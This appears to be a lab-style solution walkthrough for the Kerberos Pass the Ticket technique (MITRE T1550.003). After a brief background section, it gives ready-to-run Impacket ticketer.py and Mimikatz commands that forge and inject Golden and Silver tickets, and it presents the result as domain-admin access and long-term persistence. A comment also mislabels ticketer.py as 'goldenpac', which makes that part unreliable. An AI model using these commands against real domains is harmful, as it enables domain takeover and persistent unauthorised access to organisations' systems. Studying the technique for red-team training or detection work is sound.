# T1550.003 – Pass the Ticket | Solution Walkthrough
**Difficulty:** Expert | **OS:** Windows | **MITRE:** T1550.003

## Background: Kerberos Authentication
1. Client authenticates to KDC (DC) → gets TGT (Ticket Granting Ticket)
2. Client uses TGT to request service tickets (TGS) for specific resources
3. PtT: steal existing tickets → inject them → use resources without knowing password

## Golden Ticket Attack
```bash
# Requires: KRBTGT hash (from DCSync or DC compromise)
# Gives: Forged TGT valid for 10 years — domain persistence

# Impacket goldenpac:
python3 ticketer.py -nthash <krbtgt_ntlm_hash> -domain corp.local \
    -domain-sid S-1-5-21-... -user-id 500 administrator

# Mimikatz:
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi
kerberos::ptt golden.kirbi
# Now have DA access!
```

## Silver Ticket Attack
```bash
# Requires: Service account hash (easier to get than krbtgt)
# Gives: Forged TGS for a specific service — more targeted

python3 ticketer.py -nthash <service_hash> -domain corp.local \
    -domain-sid S-1-5-21-... -spn cifs/dc01.corp.local administrator
```
